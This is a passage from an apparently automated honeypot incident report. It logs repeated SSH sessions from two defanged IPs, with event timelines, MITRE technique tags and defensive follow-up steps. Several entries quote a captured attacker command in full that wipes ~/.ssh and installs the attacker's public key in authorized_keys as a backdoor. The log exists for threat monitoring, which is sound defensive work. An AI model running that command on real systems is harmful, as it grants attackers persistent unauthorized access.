| `2026-06-01 07:18:27` | `cowrie.command.input` |
| `2026-06-01 07:18:27` | `cowrie.log.closed` |
| `2026-06-01 07:18:28` | `cowrie.session.params` |
| `2026-06-01 07:18:28` | `cowrie.command.input` |
| `2026-06-01 07:18:28` | `cowrie.log.closed` |
| `2026-06-01 07:18:29` | `cowrie.session.params` |
| `2026-06-01 07:18:29` | `cowrie.command.input` |
| `2026-06-01 07:18:29` | `cowrie.log.closed` |
| `2026-06-01 07:18:29` | `cowrie.session.params` |
| `2026-06-01 07:18:29` | `cowrie.command.input` |
| `2026-06-01 07:18:30` | `cowrie.log.closed` |
| `2026-06-01 07:18:30` | `cowrie.session.params` |
| `2026-06-01 07:18:30` | `cowrie.command.input` |
| `2026-06-01 07:18:31` | `cowrie.log.closed` |
| `2026-06-01 07:18:32` | `cowrie.session.params` |
| `2026-06-01 07:18:32` | `cowrie.command.input` |
| `2026-06-01 07:18:32` | `cowrie.log.closed` |
| `2026-06-01 07:18:32` | `cowrie.session.params` |
| `2026-06-01 07:18:32` | `cowrie.command.input` |
| `2026-06-01 07:18:33` | `cowrie.log.closed` |
| `2026-06-01 07:18:34` | `cowrie.session.params` |
| `2026-06-01 07:18:34` | `cowrie.command.input` |
| `2026-06-01 07:18:35` | `cowrie.log.closed` |
| `2026-06-01 07:18:36` | `cowrie.session.params` |
| `2026-06-01 07:18:36` | `cowrie.command.input` |
| `2026-06-01 07:18:36` | `cowrie.log.closed` |
| `2026-06-01 07:18:37` | `cowrie.session.params` |
| `2026-06-01 07:18:37` | `cowrie.command.input` |
| `2026-06-01 07:18:37` | `cowrie.log.closed` |
| `2026-06-01 07:18:38` | `cowrie.session.params` |
| `2026-06-01 07:18:38` | `cowrie.command.input` |
| `2026-06-01 07:18:38` | `cowrie.log.closed` |
| `2026-06-01 07:18:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.15.140[.]235` to AbuseIPDB if not already reported
- [ ] Block `121.15.140[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c7a62d3d8d3

| Field | Detail |
|---|---|
| **Source IP** | `71.80.194[.]137` |
| **First Seen** | 2026-06-01 07:24 |
| **Last Seen** | 2026-06-01 07:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:24:53` | `cowrie.session.connect` |
| `2026-06-01 07:24:53` | `cowrie.client.version` |
| `2026-06-01 07:24:53` | `cowrie.client.kex` |
| `2026-06-01 07:24:54` | `cowrie.login.success` |
| `2026-06-01 07:24:55` | `cowrie.session.params` |
| `2026-06-01 07:24:55` | `cowrie.command.input` |
| `2026-06-01 07:24:55` | `cowrie.command.failed` |
| `2026-06-01 07:24:56` | `cowrie.log.closed` |
| `2026-06-01 07:24:56` | `cowrie.session.params` |
| `2026-06-01 07:24:56` | `cowrie.command.input` |
| `2026-06-01 07:24:56` | `cowrie.session.file_download` |
| `2026-06-01 07:24:56` | `cowrie.log.closed` |
| `2026-06-01 07:25:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.80.194[.]137` to AbuseIPDB if not already reported
- [ ] Block `71.80.194[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d944ee3acf9

| Field | Detail |
|---|---|
| **Source IP** | `71.80.194[.]137` |
| **First Seen** | 2026-06-01 07:25 |
| **Last Seen** | 2026-06-01 07:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:25:00` | `cowrie.session.connect` |
| `2026-06-01 07:25:00` | `cowrie.client.version` |
| `2026-06-01 07:25:00` | `cowrie.client.kex` |
| `2026-06-01 07:25:01` | `cowrie.login.success` |
| `2026-06-01 07:25:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.80.194[.]137` to AbuseIPDB if not already reported
- [ ] Block `71.80.194[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef113b7398be

| Field | Detail |
|---|---|
| **Source IP** | `71.80.194[.]137` |
| **First Seen** | 2026-06-01 07:27 |
| **Last Seen** | 2026-06-01 07:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:27:04` | `cowrie.session.connect` |
| `2026-06-01 07:27:04` | `cowrie.client.version` |
| `2026-06-01 07:27:04` | `cowrie.client.kex` |
| `2026-06-01 07:27:05` | `cowrie.login.success` |
| `2026-06-01 07:27:06` | `cowrie.session.params` |
| `2026-06-01 07:27:06` | `cowrie.command.input` |
| `2026-06-01 07:27:06` | `cowrie.command.failed` |
| `2026-06-01 07:27:06` | `cowrie.log.closed` |
| `2026-06-01 07:27:07` | `cowrie.session.params` |
| `2026-06-01 07:27:07` | `cowrie.command.input` |
| `2026-06-01 07:27:07` | `cowrie.session.file_download` |
| `2026-06-01 07:27:07` | `cowrie.log.closed` |
| `2026-06-01 07:27:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.80.194[.]137` to AbuseIPDB if not already reported
- [ ] Block `71.80.194[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da6b71399866

| Field | Detail |
|---|---|
| **Source IP** | `71.80.194[.]137` |
| **First Seen** | 2026-06-01 07:27 |
| **Last Seen** | 2026-06-01 07:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:27:10` | `cowrie.session.connect` |
| `2026-06-01 07:27:10` | `cowrie.client.version` |
| `2026-06-01 07:27:11` | `cowrie.client.kex` |
| `2026-06-01 07:27:12` | `cowrie.login.success` |
| `2026-06-01 07:27:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.80.194[.]137` to AbuseIPDB if not already reported
- [ ] Block `71.80.194[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1aaed6fca036

| Field | Detail |
|---|---|
| **Source IP** | `71.80.194[.]137` |
| **First Seen** | 2026-06-01 07:28 |
| **Last Seen** | 2026-06-01 07:28 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:28:41` | `cowrie.session.connect` |
| `2026-06-01 07:28:41` | `cowrie.client.version` |
| `2026-06-01 07:28:41` | `cowrie.client.kex` |
| `2026-06-01 07:28:42` | `cowrie.login.success` |
| `2026-06-01 07:28:43` | `cowrie.session.params` |
| `2026-06-01 07:28:43` | `cowrie.command.input` |
| `2026-06-01 07:28:43` | `cowrie.command.failed` |
| `2026-06-01 07:28:44` | `cowrie.log.closed` |
| `2026-06-01 07:28:44` | `cowrie.session.params` |
| `2026-06-01 07:28:44` | `cowrie.command.input` |
| `2026-06-01 07:28:44` | `cowrie.session.file_download` |
| `2026-06-01 07:28:44` | `cowrie.log.closed` |
| `2026-06-01 07:28:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.80.194[.]137` to AbuseIPDB if not already reported
- [ ] Block `71.80.194[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0b8a8f8a0cc

| Field | Detail |
|---|---|
| **Source IP** | `71.80.194[.]137` |
| **First Seen** | 2026-06-01 07:28 |
| **Last Seen** | 2026-06-01 07:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:28:48` | `cowrie.session.connect` |
| `2026-06-01 07:28:48` | `cowrie.client.version` |
| `2026-06-01 07:28:48` | `cowrie.client.kex` |
| `2026-06-01 07:28:49` | `cowrie.login.success` |
| `2026-06-01 07:28:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.80.194[.]137` to AbuseIPDB if not already reported
- [ ] Block `71.80.194[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c87a5d0eceb

| Field | Detail |
|---|---|
| **Source IP** | `71.80.194[.]137` |
| **First Seen** | 2026-06-01 07:30 |
| **Last Seen** | 2026-06-01 07:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:30:17` | `cowrie.session.connect` |
| `2026-06-01 07:30:17` | `cowrie.client.version` |
| `2026-06-01 07:30:17` | `cowrie.client.kex` |
| `2026-06-01 07:30:18` | `cowrie.login.success` |
| `2026-06-01 07:30:19` | `cowrie.session.params` |
| `2026-06-01 07:30:19` | `cowrie.command.input` |
| `2026-06-01 07:30:19` | `cowrie.command.failed` |
| `2026-06-01 07:30:20` | `cowrie.log.closed` |
| `2026-06-01 07:30:20` | `cowrie.session.params` |
| `2026-06-01 07:30:20` | `cowrie.command.input` |
| `2026-06-01 07:30:20` | `cowrie.session.file_download` |
| `2026-06-01 07:30:20` | `cowrie.log.closed` |
| `2026-06-01 07:30:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.80.194[.]137` to AbuseIPDB if not already reported
- [ ] Block `71.80.194[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b014e4a8956f

| Field | Detail |
|---|---|
| **Source IP** | `71.80.194[.]137` |
| **First Seen** | 2026-06-01 07:30 |
| **Last Seen** | 2026-06-01 07:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:30:24` | `cowrie.session.connect` |
| `2026-06-01 07:30:24` | `cowrie.client.version` |
| `2026-06-01 07:30:24` | `cowrie.client.kex` |
| `2026-06-01 07:30:25` | `cowrie.login.success` |
| `2026-06-01 07:30:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.80.194[.]137` to AbuseIPDB if not already reported
- [ ] Block `71.80.194[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f3578a3dfee

| Field | Detail |
|---|---|
| **Source IP** | `71.80.194[.]137` |
| **First Seen** | 2026-06-01 07:31 |
| **Last Seen** | 2026-06-01 07:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:31:55` | `cowrie.session.connect` |
| `2026-06-01 07:31:55` | `cowrie.client.version` |
| `2026-06-01 07:31:55` | `cowrie.client.kex` |
| `2026-06-01 07:31:56` | `cowrie.login.success` |
| `2026-06-01 07:31:57` | `cowrie.session.params` |
| `2026-06-01 07:31:57` | `cowrie.command.input` |
| `2026-06-01 07:31:57` | `cowrie.command.failed` |
| `2026-06-01 07:31:58` | `cowrie.log.closed` |
| `2026-06-01 07:31:58` | `cowrie.session.params` |
| `2026-06-01 07:31:58` | `cowrie.command.input` |
| `2026-06-01 07:31:59` | `cowrie.session.file_download` |
| `2026-06-01 07:31:59` | `cowrie.log.closed` |
| `2026-06-01 07:32:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.80.194[.]137` to AbuseIPDB if not already reported
- [ ] Block `71.80.194[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0046c0c1f125

| Field | Detail |
|---|---|
| **Source IP** | `71.80.194[.]137` |
| **First Seen** | 2026-06-01 07:32 |
| **Last Seen** | 2026-06-01 07:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:32:02` | `cowrie.session.connect` |
| `2026-06-01 07:32:02` | `cowrie.client.version` |
| `2026-06-01 07:32:02` | `cowrie.client.kex` |
| `2026-06-01 07:32:04` | `cowrie.login.success` |
| `2026-06-01 07:32:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.80.194[.]137` to AbuseIPDB if not already reported
- [ ] Block `71.80.194[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59b722cb25b2

| Field | Detail |
|---|---|
| **Source IP** | `71.80.194[.]137` |
| **First Seen** | 2026-06-01 07:33 |
| **Last Seen** | 2026-06-01 07:33 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:33:30` | `cowrie.session.connect` |
| `2026-06-01 07:33:30` | `cowrie.client.version` |
| `2026-06-01 07:33:31` | `cowrie.client.kex` |
| `2026-06-01 07:33:32` | `cowrie.login.success` |
| `2026-06-01 07:33:33` | `cowrie.session.params` |
| `2026-06-01 07:33:33` | `cowrie.command.input` |
| `2026-06-01 07:33:33` | `cowrie.command.failed` |
| `2026-06-01 07:33:33` | `cowrie.log.closed` |
| `2026-06-01 07:33:34` | `cowrie.session.params` |
| `2026-06-01 07:33:34` | `cowrie.command.input` |
| `2026-06-01 07:33:34` | `cowrie.session.file_download` |
| `2026-06-01 07:33:34` | `cowrie.log.closed` |
| `2026-06-01 07:33:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.80.194[.]137` to AbuseIPDB if not already reported
- [ ] Block `71.80.194[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48be3e46e301

| Field | Detail |
|---|---|
| **Source IP** | `71.80.194[.]137` |
| **First Seen** | 2026-06-01 07:33 |
| **Last Seen** | 2026-06-01 07:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:33:37` | `cowrie.session.connect` |
| `2026-06-01 07:33:37` | `cowrie.client.version` |
| `2026-06-01 07:33:38` | `cowrie.client.kex` |
| `2026-06-01 07:33:39` | `cowrie.login.success` |
| `2026-06-01 07:33:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.80.194[.]137` to AbuseIPDB if not already reported
- [ ] Block `71.80.194[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-465479331c59

| Field | Detail |
|---|---|
| **Source IP** | `71.80.194[.]137` |
| **First Seen** | 2026-06-01 07:35 |
| **Last Seen** | 2026-06-01 07:35 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:35:04` | `cowrie.session.connect` |
| `2026-06-01 07:35:04` | `cowrie.client.version` |
| `2026-06-01 07:35:04` | `cowrie.client.kex` |
| `2026-06-01 07:35:05` | `cowrie.login.success` |
| `2026-06-01 07:35:06` | `cowrie.session.params` |
| `2026-06-01 07:35:06` | `cowrie.command.input` |
| `2026-06-01 07:35:06` | `cowrie.command.failed` |
| `2026-06-01 07:35:07` | `cowrie.log.closed` |
| `2026-06-01 07:35:07` | `cowrie.session.params` |
| `2026-06-01 07:35:07` | `cowrie.command.input` |
| `2026-06-01 07:35:08` | `cowrie.session.file_download` |
| `2026-06-01 07:35:08` | `cowrie.log.closed` |
| `2026-06-01 07:35:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.80.194[.]137` to AbuseIPDB if not already reported
- [ ] Block `71.80.194[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a77832999dbc

| Field | Detail |
|---|---|
| **Source IP** | `71.80.194[.]137` |
| **First Seen** | 2026-06-01 07:35 |
| **Last Seen** | 2026-06-01 07:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:35:11` | `cowrie.session.connect` |
| `2026-06-01 07:35:11` | `cowrie.client.version` |
| `2026-06-01 07:35:11` | `cowrie.client.kex` |
| `2026-06-01 07:35:12` | `cowrie.login.success` |
| `2026-06-01 07:35:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.80.194[.]137` to AbuseIPDB if not already reported
- [ ] Block `71.80.194[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0318cbfe82d

| Field | Detail |
|---|---|
| **Source IP** | `71.80.194[.]137` |
| **First Seen** | 2026-06-01 07:38 |
| **Last Seen** | 2026-06-01 07:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:38:13` | `cowrie.session.connect` |
| `2026-06-01 07:38:13` | `cowrie.client.version` |
| `2026-06-01 07:38:14` | `cowrie.client.kex` |
| `2026-06-01 07:38:15` | `cowrie.login.success` |
| `2026-06-01 07:38:16` | `cowrie.session.params` |
| `2026-06-01 07:38:16` | `cowrie.command.input` |
| `2026-06-01 07:38:16` | `cowrie.command.failed` |
| `2026-06-01 07:38:16` | `cowrie.log.closed` |
| `2026-06-01 07:38:17` | `cowrie.session.params` |
| `2026-06-01 07:38:17` | `cowrie.command.input` |
| `2026-06-01 07:38:17` | `cowrie.session.file_download` |
| `2026-06-01 07:38:17` | `cowrie.log.closed` |
| `2026-06-01 07:38:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.80.194[.]137` to AbuseIPDB if not already reported
- [ ] Block `71.80.194[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97cb3b337d8a

| Field | Detail |
|---|---|
| **Source IP** | `71.80.194[.]137` |
| **First Seen** | 2026-06-01 07:38 |
| **Last Seen** | 2026-06-01 07:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

